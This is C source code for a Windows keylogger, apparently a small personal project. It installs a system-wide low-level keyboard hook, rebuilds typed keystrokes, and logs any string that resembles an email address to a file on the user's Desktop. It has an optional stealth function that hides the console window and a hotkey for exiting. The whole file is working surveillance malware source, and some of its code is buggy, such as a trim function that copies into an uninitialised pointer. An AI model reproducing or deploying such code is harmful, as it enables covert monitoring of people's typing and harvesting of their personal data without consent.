/*
 * Created on Mon Oct 7 10:52:45 2019
 *
 * @author		: Jeyakumar Kasi <jai@hyproid.com>
 * @Platform	: Windows OS

 * This script will watch the keys continuously and catch up those keys 
 * if the user has pressed any email address on their keyboard and store 
 * it them in a separate log file.
 * ------------------------------------------------------------------------
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <time.h>
#include <ctype.h>


#ifndef __unix__
    #include <windows.h>
#endif // __unix__

// Configuration
bool isHide = false;
char* fileName = "%userprofile%/Desktop/email_id_logs.txt";

char buff[60];
char fullPath[255];
char *emailPtr = buff;
char *resetEmailPtr = buff;

int isCapsLock(void) {
    return (GetKeyState(VK_CAPITAL) & 0x0001);
}

int validateEmailAddr(char* s)
{
    int isValid = 1;
    int length = strlen(s);

    if (!isalpha(s[0]) ||
        s[0] == '@' || s[0] == '.' || s[0] == '_' ||
        s[length-1] == '@' || s[length-1] == '.' || s[length-1] == '_') {
        return 0;
    }

    int validAt = 0;
    char domain[60] = "";
    for (int i=0; i < length; i++) {
        if (s[i] == '@') {
            validAt += 1;
        } else if (validAt > 1 ||
                  ((s[i] == '.' || s[i] == '@' || s[i] == '_') &&
                  (s[i+1] == '.' || s[i+1] == '@' || s[i+1] == '_')) || // Any continues 'dots' or 'abc_@xyz.com', then Invalid.
                  (s[i] != '.' && s[i] != '_' && !isalpha(s[i]) && !isdigit(s[i]))) {
            // Invalid
            isValid = 0;
            break;
        } else if (validAt != 0) {
            // If one '@' already found then start to catch the domain.
            char ch = s[i];
            strncat(domain, &ch, 1);
        }
    }

    if (isValid == 1 && strlen(domain) > 0) {
        //printf("Domain: %s\n", domain);

        if (domain[0] == '.' || domain[0] == '_' || strlen(domain) <= 3) {
            // If domain starts with '.' or ends with "@a.b"? then, it's Invalid.
            return 0;
        }

        // Check domain have at least on '.'
        isValid = 0;
        for (int i=0; i < strlen(domain); i++) {
            if (domain[i] == '.') {
                isValid = 1;
                break;
            }
        }
    }

    // Check atleast one '@' found?
    if (isValid == 1 && validAt == 0){
        return 0;
    }

    return isValid;
}

char *ltrim(char *str, const char *seps)
{
    size_t totrim;
    if (seps == NULL) {
        seps = "\t\n\v\f\r '\"<";
    }
    totrim = strspn(str, seps);
    if (totrim > 0) {
        size_t len = strlen(str);
        if (totrim == len) {
            str[0] = '\0';
        }
        else {
            memmove(str, str + totrim, len + 1 - totrim);
        }
    }
    return str;
}

char *rtrim(char *str, const char *seps)
{
    int i;
    if (seps == NULL) {
        seps = "\t\n\v\f\r '\"<";
    }
    i = strlen(str) - 1;
    while (i >= 0 && strchr(seps, str[i]) != NULL) {
        str[i] = '\0';
        i--;
    }
    return str;
}

char* trim(char* str)
{
    char *s;// = malloc(strlen(email) + 1);
    strcpy(s, str);
    return ltrim(rtrim(s, NULL), NULL); //trim(str, NULL);
}


char* getTime()
{
    time_t now = time(0);
    return ctime(&now);

}

char* getFileName()
{
    return fileName;
}

void _log(char s[])
{
    FILE* fh = fopen(getFileName(), "a+");
    //fputs(getTime(), fh);
    fputs(s, fh);
    fclose(fh);
}


char* getExpandedPath(char envStr[])
{
    DWORD bufCharCount = ExpandEnvironmentStrings((LPCTSTR) envStr, (LPSTR) fullPath, 255);
    if(bufCharCount) {
        // Replace all '\' to '/'
        for (int i=0; i < strlen(fullPath); i++)
            if (fullPath[i] == '\\')
                fullPath[i] = '/';
        return fullPath;
    }

    return envStr;
}


// Callback function used with SetWindowsHookEx function
LRESULT CALLBACK LowLevelKeybrdProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // This structure contains information about low level keyboard input like "Virtual Code, Scan Code, flags, timestamp"
    // and additional info. associated with the message.
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;

    //char val[5];
    DWORD dwMsg = 1;

    switch (wParam) {

        case WM_KEYDOWN:
        {
            // When the key has been pressed. Changed from "WM_KEYUP" to catch multiple strokes.

            // Assign Virtual Key Code into local variable
            DWORD vkCode = pKeyBoard->vkCode;

            if (!GetAsyncKeyState(VK_SHIFT) && vkCode == 0xBE) {
                // "." key is pressed?
                emailPtr += sprintf(emailPtr, "%c", '.');
            } else if ((vkCode >= 39) && (vkCode <= 64)) { // 0-9 Keys
                // Check SHIFT key is also pressed.
                if (GetAsyncKeyState(VK_SHIFT)) {
                    if (vkCode == 0x32) {
                        // '@' key is pressed
                        emailPtr += sprintf(emailPtr, "%c", '@');
                    }
                } else {
                    // Log the numbers
                    emailPtr += sprintf(emailPtr, "%c", vkCode);
                }
            } else if ((vkCode > 64 && vkCode < 91)) { // a-z Keys

                // Truth Table
//                Shift   Caps    LowerCase    UpperCase
//                   T       T       T            F
//                   T       F       F            T
//                   F       T       F            T
//                   F       F       T            F

                if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) {
                    // Convert into Lowercase letters.
                    vkCode += 32; // Un-capitalize
                }

                emailPtr += sprintf(emailPtr, "%c", vkCode);

            } else if (emailPtr) {

                /*
                Enter: 13
                space 32
                tab 9
                backspace 8
                left 37
                up 38*/

                if (vkCode == 13 || vkCode == 9 || vkCode == 32) {
                    // One full address is finished.
                    // Check is it a valid email address?
                    if (validateEmailAddr(trim(buff)) == 1) {
                        emailPtr += sprintf(emailPtr, "%c", '\n');
                        _log(buff);
                    }
                    // Reset the emailStr for next routine.
                    emailPtr = resetEmailPtr;

                } else if (vkCode == 8) {
                    // Backspace key is pressed. Remove one last char from "Email Str".
                    --emailPtr;
                }
            }
        break;
    } // case

    default:
        // Passes the hook information into next hook procedure in the current chain
        return CallNextHookEx(NULL, nCode, wParam, lParam);

    } // switch

    return 0;

}

// Function called by Thread
DWORD WINAPI Key_Log_Hook(LPVOID lpParam)
{
    // Retrieves a module handle for the specified module.
    HINSTANCE hExe = GetModuleHandle(NULL);

    if (!hExe) {
        fprintf(stderr, "Failed to get the handler for (.exe) file.");
        return 1;
    }

    // Installs an application defined hook procedure into hook chain
    HHOOK hKeyHook;
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) LowLevelKeybrdProc, hExe, 0);

    // Define system wide hot key (ALT + Ctrl + 9)
    RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);

    // Message loop retrieves the message from Thread's message queue & dispatches them into appropriate window procedures
    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        // if hot key combination is pressed, then exit.
        if (msg.message == WM_HOTKEY) {
            UnhookWindowsHookEx(hKeyHook);
            return 0;
        }

        // Translate Virtual Key messages into Character Messages
        TranslateMessage(&msg);

        // Dispatches a messages into Window procedures.
        DispatchMessage(&msg);
    }

    // To free System resources associated with the Hook & remove a hook from Hook chain
    UnhookWindowsHookEx(hKeyHook);

    return 0;
}

int start(char* argv[])
{
    // Create a thread
    HANDLE hThread;

    hThread = CreateThread(
                NULL,  // Default Security  Descriptor
                0,     // Default Size for the executable (Stacksize)
                (LPTHREAD_START_ROUTINE) Key_Log_Hook, // Pointer to the function to be executed
                (LPVOID) argv[0], // Pointer to a variable passed to the thread
                0,      // Thread runs immediately after creation
                NULL);  // Thread Identifier is not returned.

    if (hThread) {
        // Waits until the specified object in the "Signaled State" or "Time out interval elapses".
        return WaitForSingleObject(hThread, INFINITE);
    }
    return 1;

}

void init()
{
    //char *dest = "%appdata%\\windows._log";
    //ExpandEnvironmentStrings(dest, fileName, MAX_PATH);

    // Open file
    FILE *fh;
    fh = fopen(getFileName(), "a+");

    // See is file empty?
    long actualOffset = ftell(fh);
    fseek(fh, 0, SEEK_END);
    if (!ftell(fh) == 0) {
        // File is not empty
        fputc('\n', fh); // Set to start from next line.
    }
    fseek(fh, actualOffset, SEEK_SET);

    // Write log started time
    fputs("Logging Started at: ", fh);
    fputs(getTime(), fh);
    fputs("-------------------\n", fh);
    fclose(fh);
}

void hide(void)
{
    HWND stealth;

    // Get parent Window access
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int main(int argc, char* argv[]) {
    #ifdef __unix__
        fprintf(stderr, "Sorry, This application will work in Windows Platform only.\n");
        exit(1);
    #endif // __unix__

    fileName = (argc > 1) ? argv[1] : getExpandedPath(fileName);
    printf("Log Filename: %s\n", fileName);

    // Key Logging
    int startKey_logging(char* argv[]);
    if (isHide) hide();

    init();  // Initialize the log file
    start(argv); // Start logging keys

    return 0;
}